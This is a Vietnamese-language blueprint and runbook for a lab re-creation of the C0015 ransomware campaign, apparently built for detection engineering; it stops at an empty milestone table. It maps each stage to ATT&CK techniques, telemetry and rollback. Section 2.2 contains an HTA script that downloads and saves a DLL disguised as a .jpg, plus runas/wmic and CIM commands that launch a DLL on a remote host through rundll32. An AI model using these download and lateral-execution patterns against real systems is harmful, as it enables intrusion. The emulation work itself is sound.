# C0015 Attack-Chain Blueprint & Runbook (v3) — chuỗi duy nhất để triển khai

> **Đây là blueprint DUY NHẤT của chuỗi lab C0015-inspired**: thứ tự thời gian, input/output thật, handoff có bằng
> chứng, failure branch và rollback. Không phải danh sách ATT&CK hay capability matrix (các tài liệu hỗ trợ:
> `docs/attack-chain-plan.md` (historical fidelity + canonical 0–15), `docs/evidence-matrix-v2.md`,
> `docs/handoff-contracts.md`, `docs/correlation-architecture.md`, `docs/payloads-and-c2.md`).
>
> **Quy tắc tuyệt đối:** chain chỉ end-to-end khi **một `run_id` duy nhất** có evidence cho mọi handoff bắt buộc.
> Thiếu một handoff → ghi `CHAIN BROKEN AT S<n>`; không vá bằng timestamp/marker/narrative. Consumer phải **dùng**
> output (đọc artifact/state), không chỉ thấy file tồn tại.
>
> **Nguồn hạ tầng lab (bàn giao 2026-09-26):** §1.1 ghi các fact đã verify — Sysmon live **EID 7/10 disabled**, config
> hash `D30CD93C…` (≠ mọi bản trong repo), FS01 **Win10 Pro 19045**, ACL shares (duc.user→Finance, it.admin→IT),
> Fleet `https://100.77.46.126:8220` (Elastic 9.5.3), Word trên WS01 "pending verification". Mục chưa verify giữ
> `UNKNOWN`, không tự suy đoán.
>
> **Payload & C2 (2026-10):** payloads benign config-driven tại `payloads/` (macro/HTA/DLL/beacon/impact — không
> hardcode, map code→technique trong `payloads/README.md`); quyết định C2 (C2-SIM v2 + CALDERA v5 primary + Sliver
> tùy chọn có điều kiện + Havoc loại) và đánh giá AD 3 máy tại **`docs/payloads-and-c2.md`**. Chính sách: không
> technique nào để `UNKNOWN`/chỉ-quan-sát trong chain — mọi gap lịch sử có technique lab thực thi được + label.
>
> **Evidence labels:** `[OBSERVED-C0015]` · `[INFERRED-C0015]` · `[UNKNOWN-C0015]` · `[SUPPLEMENTAL-LAB-TECHNIQUE]` ·
> `[LAB-VERIFIED]` (đã verify trên máy lab thật) · `[NOT-VERIFIED-IN-REPO]` (narrative-only) · `[NOT RUN]`.
> Classification: `LIVE LAB BEHAVIOR — READY TO TEST` · `LIVE LAB BEHAVIOR — DESIGN ONLY` · `SAFE SURROGATE — PARTIAL`
> · `ANALYSIS / REPLAY ONLY`. Mỗi stage tách 2 kết luận: **Lab functional** và **Historical fidelity**.

## 1. Đối chiếu nguồn (Tidal / MITRE / DFIR)

> Tidal export files KHÔNG nằm trong workspace (không tìm thấy file; URL app.tidalcyber.com cần app-auth, chỉ trả
> title). Đối chiếu dùng **danh sách 34 technique + 11 software bạn cung cấp trong prompt** + MITRE C0015 + DFIR
> Report (đã fetch). Không tự bịa nội dung Tidal ngoài danh sách đã cho.

**Khác biệt Tidal vs MITRE — không gộp âm thầm:**
- MITRE C0015 (chính thức) có **T1055.001** (DLL injection: D8B3→Winlogon, DFIR trực tiếp). Export Tidal có `T1055` (parent). Parent T1055 là họ technique; campaign claim cụ thể là **sub T1055.001**. Giữ `T1055.001` làm canonical; không kể T1055 parent thành technique riêng.
- Export còn lại có **T1071.001** (Web Protocols) — KHÔNG nằm trong danh sách 34, cũng không nằm trong MITRE C0015. DFIR mô tả C2 qua HTTP/HTTPS (Bazar 443, CS 80/443) nên T1071.001 là **mapping tổng quát cho kênh C2** của Tidal, không phải technique claim của campaign. Xử lý: ghi là `[INFERRED-C0015]` cho kênh C2 (web) làm context; **không đưa vào danh sách 34**.
- **T1003 (LSASS)** KHÔNG có trong cả 34 lẫn MITRE C0015 (DFIR chỉ nói "likely"). Lab thêm nhánh bổ sung `[SUPPLEMENTAL-LAB-TECHNIQUE]` gắn T1003.001 — detection-design only (mục 7).
- **Cam kết phủ kín:** mọi technique (34 + T1055 parent + T1071.001) được ánh xạ vào stage ở **§2.1**; không tái tạo được → vá bằng technique cùng tactic, ghi lý do, không bỏ trống.
- **T1588.001/.002 (Obtain Capabilities):** hành vi Resource Development, nằm ngoài khả năng tái hiện của lab — **document-only** `[OBSERVED-C0015]` context (Cobalt Strike/Conti được dùng + AdFind/AnyDesk/Process Hacker xuất hiện là hệ quả); không tạo stage giả.

**Phân loại nguồn cho 34 technique** (mapping Tidal ≠ mô tả kỹ thuật đầy đủ):

| Technique | Nguồn chứng cứ | Ghi chú |
|---|---|---|
| T1047 (WMI) | `[OBSERVED-C0015]` — DFIR trực tiếp: WMIC remote process creation → rundll32 → 143.dll | Cơ chế thực thi (telemetry: E1 wmiprvse→child). **≠ T1570** |
| T1570 (Lateral Tool Transfer) | `[OBSERVED-C0015]` — MITRE/DFIR: chuyển CS sang host khác qua WMI | Khía cạnh "chuyển tooling". **DFIR KHÔNG ghi cơ chế đưa 143.dll lên target trước khi chạy → transfer mechanism `[UNKNOWN-C0015]`**; lab dùng SMB C$ copy `[SUPPLEMENTAL-LAB-TECHNIQUE]` (mục 5.8) |
| T1055.001 (DLL injection) | `[OBSERVED-C0015]` — DFIR trực tiếp: D8B3→Winlogon; 143.dll→svchost ('UnistackSvcGroup CDPUserSvc') | Lab KHÔNG tái hiện (ANALYSIS/REPLAY) |
| T1218.011 (Rundll32) | `[OBSERVED-C0015]` — DFIR: D574/D8B3/143.dll qua rundll32 | Load trong process rundll32 — **≠ injection** |
| T1218.005 (Mshta) | `[OBSERVED-C0015]` — DFIR: HTA (JS/VBS) thực thi; MITRE nói "mshta to execute DLLs" là tóm lược | mshta chạy HTA; DLL được chạy bởi **regsvr32** (T1218.010) — không gán DLL-load cho mshta |
| T1218.010 (Regsvr32) | `[OBSERVED-C0015]` — DFIR: REGSVR32 execute `compareForfor.jpg` | |
| T1553.002 (Code Signing) | DFIR trực tiếp: DLL cert invalid/failed → mapping của Tidal/MITRE cho observation cert; **không có bằng chứng tấn công ký mã** | Lab giữ observable: DLL không ký |
| T1105 (Ingress Tool Transfer) | `[OBSERVED-C0015]` — DFIR: tải tools (`compareForfor.jpg`, AdFind, AnyDesk, Process Hacker) | Lab: C2-SIM `/dl` + SMB copy |
| T1016 (Network Config Discovery) | `[OBSERVED-C0015]` — DFIR: lookup myexternalip[.]com lấy public IP | Lab: mock lookup nội bộ |
| T1018/T1057/T1069.001/.002/T1482/T1124/T1135/T1059.003 | `[OBSERVED-C0015]` — DFIR ghi lệnh cụ thể | |
| T1074.001 (staging) | `[OBSERVED-C0015]` — `c:\ProgramData\found_shares.txt` | |
| T1567.002/T1030 | `[OBSERVED-C0015]` — Rclone→MEGA ×2, `--bwlimit 10M` | Lab: internal sink (partial) |
| T1021.001/T1219.002 | `[OBSERVED-C0015]` — RDP ngày 2 + sau 143.dll ~9h; AnyDesk `Videos\` ngày 5 | |
| T1486/T1083 | `[OBSERVED-C0015]` — Conti batch, không chạm DC; file listing sau | |
| T1204.002/T1566.001/T1027/T1036/T1005/T1039/T1588.001/.002/T1059.005/.007 | `[OBSERVED-C0015]` (macro/HTA/jpg-masquerade/collection) — delivery phishing `[INFERRED-C0015]` | |

**11 software — quyết định dùng trong lab (chi tiết mục 6):** Bazar→SAFE SURROGATE (C2-SIM v2) · Cobalt Strike→
SAFE SURROGATE (C2-SIM v2) · Conti→SAFE SURROGATE (simulator bounded) · AdFind→NOT USED (DFIR chỉ thấy file write,
không execution) · Rclone→SAFE SURROGATE (HTTP POST sink) · AnyDesk→NOT USED (relay public) / tùy chọn install
portable vào path bất thường · cmd/net/nltest/tasklist/ping/mshta/regsvr32/rundll32/wmic→**USE** (native; wmic vắng
trên 24H2+ → fallback PowerShell CIM = SAFE SURROGATE, telemetry khác).

## 1.1 Lab infrastructure — verified facts (handoff 2026-09-26)

| Mục | Fact đã verify | UNKNOWN (chờ M-1) |
|---|---|---|
| Domain | `c0015.lab`/`C0015`; DC01 `.10` (DNS+LDAP+Netlogon OK); nltest `PASS` từ WS01/FS01 | DC01 OS edition/build; DC01 có Elastic Agent không |
| Network | VMnet2 192.168.50.0/24, DHCP off; WS01 `.20` (Ethernet1; Ethernet0 NAT `192.168.106.136` gw `.2`); FS01 `.30`; Kali dự kiến `.100` | FS01 Ethernet0/NAT IP; Kali/ELASTIC01 IP ngoài Fleet URL; vCPU/RAM/disk; snapshot inventory |
| OS | WS01 Win10 (build cần verify); **FS01 Win10 Pro 19045** | WS01 build chính xác |
| Sysmon (WS01/FS01) | 15.21, schema 4.91, `C:\Tools\sysmon64.exe` + `C:\Tools\sysmon-c0015.xml`; **live baseline: EID 1,3,11–14,17–22 enabled; 7 và 10 DISABLED**; exclusions: EID3→`DC01:53`, EID11→Elastic/Edge/diag, Registry include Run/RunOnce/Services/Classes/Environment, Registry exclude VMware Tcpip | — |
| **Sysmon hash reconcile** | Live hash `D30CD93C83E3409F7AA1D45FEDEA2695B9F1481FF1D3DFF019AE2B8F01D99C18` ≠ committed repo (`892EA3A1…` LF / `1E68381B…` CRLF) ≠ working-tree (`42BC6998…`) — **config đang chạy là bản thứ ba không có trong repo** (baseline + exclusions, chưa có EID 2/5/6/7/8/10/15/25/26/29). **Hệ quả chain:** EID 7 đang tắt trên máy thật → acceptance S2/S9 (ImageLoad hash) CHƯA thu được nếu không deploy config EID 7 scoped (working-tree repo đã soạn sẵn). M-1 quyết định + deploy, rồi pull file live về repo đối chiếu. | — |
| AD/ACL | `duc.user` ∈ Finance; `it.admin` ∈ IT-Admins (không DA). Shares: Finance=`C:\Shares\Finance` (Finance Change; `budget-q3.txt`, `payroll-notes.txt`); IT=`C:\Shares\IT` (IT-Admins Change; `server-inventory.txt`). **it.admin KHÔNG có quyền Finance** | it.admin có local admin trên FS01 không (**WMI Win32_Process Create cần admin trên target**; 4672 ở run 3B cũ chỉ là narrative) |
| Elastic | 9.5.3; Fleet `https://100.77.46.126:8220/`; policy `C0015-Windows-Endpoints`; ns `c0015`; agent Healthy (WS01/FS01); CA riêng (`fleet-ca.crt` khi enroll) | parity rule Elastic↔repo |
| Office | WS01: ODT Word-only (O365HomePremRetail, 64-bit), ClickToRunSvc running; **Word install: "Pending verification"** → gate của S1 | — |

## 2. Attack-chain blueprint (bảng 13 cột bắt buộc)

| Stage | Mục tiêu | Host/account | Tool | Input | Hành vi | Output | Consumer | Telemetry | Correlation keys | Acceptance | Failure branch | Rollback |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| S1 Entry | User-execution entry | WS01 `duc.user` Medium | `test.docm` macro benign (**Word install: pending verify → M-1 gate**) | `run_id` | Trigger macro thật (Alt+F8) → VBA `Shell()` → cmd | E1 chain + file drop | S2 | E1 WINWORD→cmd; E11 | ProcessGuid (WS01); run_id | Macro thật chạy (side-effect file) + E1 + run_id | Macro không kích hoạt → `BLOCKED BY ENVIRONMENT`, dừng | Đóng doc, xóa drop files, restore Desktop |
| S2 Bootstrap | HTA→HTTP→regsvr32 DLL | WS01 `duc.user` | mshta, regsvr32, HTTP host:8000; HTA benign **JS+VBS+base64** (T1027/T1059.005/.007); DLL masquerade `.jpg` (**T1036**) | S1 chain | HTA GET → ghi DLL `c0015-comparefor.jpg` → regsvr32 → export chạy | DLL + marker + hash continuity | S3 | E1 cmd→mshta→regsvr32; E7; E11; E3(gap); server log | ProcessGuid; SHA-256 | Chain E1+E7+E11 cùng ProcessGuid; hash Kali↔WS01 khớp; E3 gap ghi rõ (**EID 7 cần deploy scoped — M-1**) | E7 thiếu → `SENSOR GAP` dừng; hop mshta `UNRESOLVED` | Xóa `C:\Users\Public\C0015\*`, tắt HTTP svc |
| S3 Session 1 | Bazar-like foothold | WS01 `duc.user` (session1) | C2-SIM v2 + agent benign (do S2 tạo) | S2 bootstrap | Public-IP mock → register session1 → task loop | `session1` token + server receipt S1 | S4 | E1 agent; E3/E22; server log | token; host; time | Receipt server-side + ≥1 callback cycle + run_id | Không receipt → `PARTIAL`, dừng S4 | Kill agent, xóa token file |
| S4 Discovery | Recon | WS01 session1 | cmd, net, nltest, tasklist, ping | `session1` | Chạy đúng lệnh DFIR: `tasklist /s`, `net group "domain admins" /dom`, `net localgroup "administrator"`, `nltest /domain_trusts /all_trusts`, `net view /all /domain`, **`net view /all time` (T1124)**, **`ping` (T1018)** (task từ C2-SIM) | Discovery telemetry | S5 | E1 (parent=agent); E3 (connection) | parent ProcessGuid | ≥4 behavior family DETECTED (C1) + run_id | Lệnh rỗng (lab nhỏ) → ghi giới hạn | — |
| S5 Share artifact | Structured discovery output | WS01 session1 | net view/Get-SmbShare read-only | S4 | Enumerate shares → `found_shares.txt` + `ART-04-01` | `art04_01` (hash) | S6 | E1 powershell; E11; S5145 (nếu probe) | file path + SHA-256 | Artifact tồn tại, liệt kê FS01\Finance readable + hash + run_id | Không share readable → S6 không tạo manifest → **chain dừng** | Xóa artifact |
| S6 Decision | Target selection từ artifact | Kali/host orchestrator | Orchestrator (script) | `art04_01` | **Đọc `art04_01`** → rule (readable + high-value) → ghi `ART-04-02` | `art04_02` (target=FS01, account, actions, reason) | S7 | Ledger step (không endpoint event) | run_id; artifact id | `art04_02.target.host` suy ra từ nội dung `art04_01` (log reason); không hard-code | Không target hợp lệ → downstream `NOT RUN` | Xóa manifest |
| S7 Auth context | Xác định identity được phép cho WMI (validation only) | WS01→FS01 `it.admin` (handle per-run, **không ghi secret**) | Native logon controls (**credential tường minh**) | `art04_02.auth` | 3 control bằng credential tường minh: `duc.user`→denied, `it.admin`→allowed, revoked→denied; **S7 KHÔNG cấp identity cho tiến trình** (phiên `IPC$`/logon ≠ token tiến trình) | `art05_01` (LogonId + event refs — **EVIDENCE**, không phải control input của S8) | S8 (đọc account được phép từ `art04_02`; S8 tự dùng credential tường minh) | S4648; S4624 T3; S4672; S4625 | LogonId; user SID | denied/allowed/denied đúng; LogonId liên kết; không secret trong ledger/artifact/log | S4625 không xuất hiện → `INGEST/MAPPING GAP` dừng | Revoke account (control) |
| S8 WMI exec + tool handoff | Remote process trên target | WS01→FS01 `it.admin` | 8a: SMB `\\FS01\C$\C0015\` copy (T1570 surrogate, dùng phiên IPC$); 8b: **WMI bằng credential tường minh** — `runas it.admin → wmic` (giữ wmic.exe) hoặc `Invoke-CimMethod -Credential` (**KHÔNG dùng token hiện tại = duc.user**) | `art04_02` + **credential tường minh** + DLL (C2-SIM `/dl` hoặc staging) | 8a copy `c0015_143_surrogate.dll` → FS01; 8b WMI dưới identity `it.admin` (S4648 explicit cred) → rundll32 chạy trên FS01 (**cần it.admin local admin trên FS01 — verify M-1**) | `art06_01` (FS01 E1 wmiprvse→child + DLL hash + LogonId) | S9 | S4648 (explicit cred WS01); S5140/S5145 (C$); E11 FS01; S4624/4672; S4688; E1 wmiprvse→rundll32 | LogonId; ProcessGuid | 4-gate: process/identity/process+DLL/callback(S9) cùng run_id; **identity = S4648 + LogonId khớp account được chọn**; **transfer có evidence riêng (8a), không suy từ process chạy** | wmic/runas không khả dụng → CIM `-Credential` ghi PARTIAL (telemetry khác); E1 FS01 thiếu → `SENSOR GAP` dừng | Xóa DLL trên FS01; revoke handle |
| S9 Session 2 | Second foothold | FS01 `it.admin` (WMI ctx) | C2-SIM v2 (register/task/result) | `art06_01` | DLL (load bởi rundll32) register session2 → task `T-DISCOVER-CORPUS` → result | **`ART-07-01` receipt server-side** | S10 | E1; E7; E11; E3; server receipt | token; host; LogonId | Receipt + callback telemetry FS01 + S8 evidence; **KHÔNG marker-only** | Không receipt hợp lệ → `PARTIAL`, **không gọi second foothold**, S10 đổi context ghi rõ | Kill rundll32, xóa token |
| S9b Injection study | Telemetry E10/E8 (không thực thi) | toy `lab-target.exe` (nếu duyệt) | Fixtures/replay | — | Phân tích historical + fixture E10/E8; toy/replay nếu user duyệt từng lần | Note phân tích | — | E10/E8 fixtures (synthetic) | — | Không đụng process hệ thống; **không code injection trong repo** | — | — |
| S10 Collection/staging | Lấy corpus + manifest | FS01 session2 | Corpus read + manifest | `session2` + `art04_02.allowed_actions` | Đọc **`\\FS01\IT` (session2 = it.admin — T1039)** + **file local lab-owned (T1005)**; `Finance` do duc.user đọc ở S4/S5 (EXP-005 verified, 5145) → `ART-08-01` (file/SHA-256/bytes) | `art08_01` | S11a | S5145 (loopback verify M-1); E11; E1 | file hash; bytes | Manifest ↔ corpus khớp (count/bytes/hash) + run_id | S5145 không sinh (loopback) → C4 hạ `CONTEXTUAL`, ghi rõ | Xóa staged copies |
| S11a Transfer r1 | Exfil lượt 1 (mirror ngày 1) | FS01 → 192.168.50.1:8081 | p5_sink (repo mirror) | `art08_01` | POST `/ingest/c0015-p5` file đã duyệt (**chunked ≤512 B = DESIGN ONLY — cần sink v2 ghép chunk + hash; hiện single POST ≤1024 B = T1030 xấp xỉ**) | `art09_01[r1]` receipt | S12 | E3 (caveat); sink log; receipt | hash; client ip | receipt.hash == manifest.hash == allowlist | 403 → `PREVENTED` ghi | — |
| S12 RDP | Remote access (mirror ngày 2, xen giữa 2 lượt transfer) | WS01↔FS01 `it.admin` | Native RDP | sau S11a | RDP session + quan sát | `art10_01` (DET-008) | S11b | S4624 T10; S4778/4779 | logon type; source | DET-008 định nghĩa + evidence + run_id | Audit vắng S4778/4779 → env-dependent ghi | Đóng session |
| S11b Transfer r2 | Exfil lượt 2 (mirror ngày 4) | FS01 → sink | p5_sink | `art08_01` | POST lần 2 | `art09_01[r2]` | S13 | Như S11a | Như S11a | 2 receipt + cùng run_id | — | — |
| S13/S13b Precursor | AnyDesk-like + LSASS branch | FS01 admin | Portable app hợp pháp (tùy chọn); fixtures E10 | S11b | 13: install vào path bất thường (tùy chọn); 13b: **phân tích E10 fixture lsass** (detection-design only) | Note + install telemetry | S14 | E1/E11 path; E10 fixtures (synthetic) | path; target image | Không dữ liệu nhạy cảm; không dump; branch = design only | — | Gỡ app; bỏ fixtures sau dùng |
| S14 Impact + restore | Bounded impact + khôi phục | FS01 corpus allowlist, admin | Simulator bounded (chưa code) | `art12_01` manifest | Transform corpus + note → restore từ backup → verify | `art13_01` + `art14_01` | S15 | E2/E11/E26; restore diff | root path; process | Không exit corpus; restore count/hash/ACL khớp | Restore lệch → `PARTIAL` + incident note | Restore từ backup |
| S15 E2E ×2 | Engineering + investigation | toàn lab | Runbook + scorecard | tất cả state | Run 1: runbook hiển thị; Run 2: analyst chỉ nhận telemetry (ledger ẩn) | `art15_01` scorecard | — | Toàn correlation | run_id xuyên chuỗi | Analyst dựng lại chain từ telemetry; so sánh ledger | Handoff thiếu → `CHAIN BROKEN AT S<n>` ghi, không gọi end-to-end | — |

## 2.1 Technique coverage matrix — 34 + T1055/T1071.001 (không bỏ sót, vá cùng tactic khi không tái tạo được)

| Technique | Stage | Lab method | Trạng thái |
|---|---|---|---|
| T1005 Data from Local System | S10 | Đọc file local lab-owned trên FS01 (vd `C:\C0015\local\lab-notes.txt`) từ session 2; E1 + E11/4663 | LIVE (bổ sung để phủ) |
| T1016 Network Config Discovery | S3 | Public-IP lookup mock nội bộ (`public-ip.txt`=203.0.113.77) | DESIGN (S3) |
| T1018 Remote System Discovery | S4 | `ping` (+ net view /all /domain) | READY |
| T1021.001 RDP | S12 | RDP native giữa 2 lượt transfer (mirror ngày 2) | READY |
| T1027 Obfuscated Files | S2 | HTA benign chứa chuỗi **base64 benign + bước decode** (observable T1027) | LIVE (bổ sung) |
| T1030 Transfer Size Limits | S11a/b | **DESIGN ONLY:** chunked ≤512 B cần sink v2 (ghép chunk + hash); hiện single POST ≤1024 B = xấp xỉ (giới hạn kích thước cố định) | DESIGN ONLY (sink v2 pending) |
| T1036 Masquerading | S2 | DLL benign tên **`c0015-comparefor.jpg`** (đuôi .jpg) load qua regsvr32 — mirror `compareForfor.jpg` | LIVE (bổ sung) |
| T1039 Data from Network Shared Drive | S10 | `\\FS01\IT` đọc bởi it.admin (session 2); `Finance` do duc.user đọc ở S4/S5 (EXP-005 verified) | READY |
| T1047 WMI | S8 | WMI **credential tường minh**: `runas it.admin → wmic` (giữ telemetry wmic.exe) hoặc `Invoke-CimMethod -Credential`; **không dùng token hiện tại** | READY (verify it.admin local admin — M-1) |
| T1055 (parent) / T1055.001 DLL Injection | S9b | **ANALYSIS/REPLAY ONLY** — toy `lab-target.exe` (nếu duyệt) hoặc fixture replay E10/E8; **không inject** Winlogon/svchost | ANALYSIS (vá = telemetry replay cùng tactic Defense Evasion) |
| T1057 Process Discovery | S4 | `tasklist /s` | READY |
| T1059.003 cmd | S4 | native cmd từ session 1 | READY |
| T1059.005 VBS + T1059.007 JS | S2 | HTA benign chứa **cả VBS và JS** (hai script block) | LIVE (bổ sung) |
| T1069.001/.002 Group Discovery | S4 | `net localgroup "administrator"`; `net group "domain admins" /dom` | READY |
| T1074.001 Local Data Staging | S5 + S10 | `C:\ProgramData\found_shares.txt` + staging `C:\C0015\staging\` | READY/DESIGN |
| T1083 File/Dir Discovery | S14 | File listing post-impact để verify (mirror DFIR) | DESIGN |
| T1105 Ingress Tool Transfer | S2 (+S9 tùy chọn C2-SIM `/dl`) | HTTP GET từ Kali:8000 (P1 verified) | VERIFIED mechanics |
| T1124 System Time Discovery | S4 | `net view /all time` | READY (bổ sung tường minh) |
| T1135 Network Share Discovery | S5 | `net view`/`Get-SmbShare` read-only → found_shares | READY |
| T1204.002 User Execution | S1 | Macro Word (điều kiện: Word install verify — M-1 gate) | READY (gated) |
| T1218.005 Mshta | S2 | mshta chạy HTA (KHÔNG gán DLL-load cho mshta) | READY |
| T1218.010 Regsvr32 | S2 | regsvr32 load DLL (`.jpg`) | VERIFIED mechanics |
| T1218.011 Rundll32 | S8/S9 | rundll32 **load** DLL trong process của nó — **≠ injection** | READY |
| T1219.002 Remote Desktop Software | S13 | Tùy chọn: cài portable app hợp pháp vào path bất thường; relay public KHÔNG dùng | OPTIONAL/ANALYSIS |
| T1482 Domain Trust Discovery | S4 | `nltest /domain_trusts /all_trusts` | READY |
| T1486 Data Encrypted for Impact | S14 | Simulator bounded (rename/ext/note trên corpus allowlist; restore) | DESIGN (vá = transform cùng tactic Impact) |
| T1553.002 Code Signing | S2/S9 | **Observable:** DLL không ký (E7 `signed=false`) — giữ đúng observation cert của DFIR, không giả vờ ký mã | LIVE observable |
| T1566.001 Spearphishing Attachment | — | **Document-only** `[INFERRED-C0015]` (delivery "likely") | DOC |
| T1567.002 Exfil to Cloud Storage | S11a/b | Internal sink allowlist (vá = exfil over internal web service, cùng tactic Exfiltration; MEGA KHÔNG dùng) | SAFE SURROGATE |
| T1570 Lateral Tool Transfer | S8a | SMB `\\FS01\C$` copy DLL trước khi chạy (cơ chế supplemental — lịch sử `[UNKNOWN-C0015]`) | LIVE (bổ sung tường minh) |
| T1588.001/.002 Obtain Capabilities | — | **Document-only** (Resource Development) | DOC |
| T1071.001 Web Protocols (KHÔNG thuộc 34) | S3/S9 | C2-SIM kênh HTTP(S) — context cho C2-over-web; không kể là technique campaign | SURROGATE channel |
| T1003.001 LSASS (supplemental, KHÔNG thuộc 34) | S13b | **Detection-design only:** objectives/evidence/C-LSASS/evaluation bằng fixture replay; **không** lệnh/code/runbook, không dùng cho WMI | BRANCH (user-managed) |

## 2.2 Surrogate implementation notes — sửa theo review (identity S7–S8, atob HTA, chunk S11)

### a) S7→S8: identity cho WMI phải là credential tường minh (đã sửa gate)
Phiên `net use \\FS01\IPC$` **KHÔNG đổi token tiến trình** trên WS01; nó chỉ phục vụ 8a (SMB copy). WMI (8b) phải chạy dưới identity `it.admin`:
```powershell
# Primary — giữ telemetry wmic.exe (T1047); mật khẩu nhập qua prompt, KHÔNG vào command line/log:
runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""

# Alternate — PSCredential tường minh (telemetry = powershell.exe, KHÔNG phải wmic.exe → ghi PARTIAL):
$cred = Get-Credential C0015\it.admin
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -ComputerName FS01 -Credential $cred `
  -Arguments @{ CommandLine = "rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry" }
```
Evidence identity: **WS01 S4648 (explicit credential) + FS01 S4624/4672 cùng LogonId khớp account được chọn**.
**Gate S8 chỉ đóng khi có S4648 + LogonId khớp.** Tránh tuyệt đối `wmic /password:*` (lộ secret vào command line/log).

### b) S2: HTA MSHTML/JScript KHÔNG có `atob()` (đã sửa)
`atob()`/`btoa()` là API trình duyệt, không đảm bảo tồn tại trong JScript/MSHTML của HTA. Thay bằng VBScript + MSXML `bin.base64` (mirror T1027); JS chỉ làm HTTP GET (T1059.007):
```html
<script language="VBScript">
  ' [LAB-SURROGATE] base64 decode bằng MSXML bin.base64 — KHÔNG dùng JS atob()
  Function B64Decode(s)
    Dim doc, el
    Set doc = CreateObject("Msxml2.DOMDocument")
    Set el = doc.createElement("b64")
    el.dataType = "bin.base64" : el.text = s
    B64Decode = el.nodeTypedValue
  End Function
  Dim b : b = B64Decode("YzAwMTUgbGFiIGJlbmlnbg==")   ' "c0015 lab benign"
  Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
  fso.CreateTextFile("C:\Users\Public\C0015\b64-marker.txt", True).Write "c0015 lab benign"
</script>
<script language="JScript">
  // [LAB-SURROGATE] JS: HTTP GET + lưu DLL (KHÔNG dùng atob)
  var x = new ActiveXObject("MSXML2.ServerXMLHTTP");
  x.open("GET", "http://192.168.50.100:8000/c0015-comparefor.jpg", false); x.send();
  var s = new ActiveXObject("ADODB.Stream"); s.Open(); s.Type = 1; s.Write(x.responseBody);
  s.SaveToFile("C:\\Users\\Public\\C0015\\c0015-comparefor.jpg", 2);
</script>
```

### c) S11: chunked ≤512 B = DESIGN ONLY (cần sink v2)
`p5_sink.py` hiện nhận **1 POST ≤1024 B** và hash toàn bộ body. Để có T1030 chunk thật: sink v2 nhận chuỗi POST có
`chunk-index`/`chunk-total` + session, ghép lại rồi hash theo allowlist. Cho tới khi có sink v2, S11 chạy **single
POST ≤1024 B** (giữ nguyên allowlist hash) và ghi T1030 là **xấp xỉ (giới hạn kích thước cố định)**.

## 3. Handoff — trả lời 5 câu hỏi mỗi transition

1. **S2→S3 (entry/bootstrap→session 1):** output tạo session 1 = **agent process được bootstrap tạo** (DLL của S2
   spawn agent từ `C:\Users\Public\C0015\`). S3 tiêu thụ: agent là process chạy session-1 loop. Chứng minh cùng
   host/run: **E1 parent-child (regsvr32/mshta → agent)** + E7 hash của agent + register POST từ WS01. Dừng nếu:
   agent không có E1 hoặc không register. Consumer dùng thật: server receipt ghi token do chính agent gửi — không
   phải file tồn tại.
2. **S5→S6 (discovery→decision):** S5 tạo `ART-04-01` (share list). S6 **đọc file** (mở + parse) → rule → ghi
   `ART-04-02`. Chứng minh: ledger ghi `read_artifact: ART-04-01` + `selection_reason` trích từ nội dung (hash
   `ART-04-01` ghi lại). Dừng nếu artifact rỗng/không parse. Đây là consumption thật (parse + branch theo nội dung).
3. **S7→S8 (credential/auth→WMI):** `art05_01` = **evidence** (LogonId + event refs chứng minh account nào được phép), KHÔNG phải control input. Control input của S8 = **credential tường minh do operator cấp** (runas/PSCredential) — không đọc từ bundle, không nằm ledger. **Quan trọng:** phiên `net use \\FS01\IPC$` chỉ dùng cho 8a (SMB copy); nó **KHÔNG đổi token tiến trình** trên WS01, nên `wmic` chạy trực tiếp vẫn dùng token hiện tại (duc.user) → `Access is denied`. S8b phải chạy WMI **dưới identity it.admin**. Chứng minh identity: S4648 (explicit credential) trên WS01 + S4624/4672 LogonId trên FS01 khớp account được chọn; không ghi secret vào ledger/artifact/log (schema cấm key password/secret — `scripts/lab_tools.py artifact-check`).
4. **S8→S9 (WMI→target execution/tool handoff):** 8a = tool handoff (DLL tới FS01 qua C$ với evidence S5140/5145 +
   E11) **trước** 8b = T1047 execution (E1 wmiprvse→rundll32). Không tuyên bố transfer từ việc process chạy; hai
   evidence riêng cùng run_id. T1570 (transfer facet) vs T1047 (execution facet) ghi hai dòng khác nhau.
   **Identity của 8b được chứng minh bằng S4648/S4624/4672 (LogonId), không bằng phiên IPC$ của 8a.**
5. **S9→S10→S11 (session 2→collection→sink):** S9 receipt (server-side) → S10 manifest (`ART-08-01`) → S11 POST.
   Hash xuyên suốt: manifest.hash == receipt.hash == allowlist. Sender evidence (E1/E3) + receiver evidence (sink
   log) cùng run_id. Không coi sink receipt là đủ nếu thiếu sender evidence.
6. **S11a→S12→S11b:** giữ quan hệ thời gian nguồn (ngày 1 → ngày 2 → ngày 4); RDP chỉ chạy giữa hai receipt trong
   cùng run. Không đảo thứ tự để tiện lab.
7. **S14→restore:** simulator chỉ xử lý corpus allowlist (root cố định, caps file/bytes/time, no system/UNC/
   symlink/SYSTEM/propagation); restore từ backup verify count/hash/ACL; lệch → `PARTIAL` + incident note.

## 4. Dependency graph

```text
run_id: RUN-YYYYMMDD-<seq>  (ledger: evidence/run-ledger/RUN-<id>.json)
S1 ──E1-chain──▶ S2 ──agent+E7──▶ S3 ──token──▶ S4 ──E1──▶ S5 ──ART-04-01──▶ S6 ──ART-04-02──▶ S7
                                                                                        │
      S8 (8a tool handoff C$ + 8b wmic/CIM) ◀──credential-handle + art05_01(evidence)──┘
        │ ART-06-01
        ▼
      S9 ──ART-07-01 receipt──▶ S10 ──ART-08-01──▶ S11a ──receipt r1──▶ S12 (RDP, mirror ngày 2)
                                                                          │
                                  S11b (receipt r2, mirror ngày 4) ◀──────┘
                                    │
                                  S13/S13b (AnyDesk-like + LSASS branch analysis-only) ──▶ S14 (impact+restore) ──▶ S15 (E2E ×2 + scorecard)
```

## 5. Runbook theo milestone (gate + thứ tự)

| M | Scope | Input | Thao tác | Output | Gate (đạt mới qua) |
|---|---|---|---|---|---|
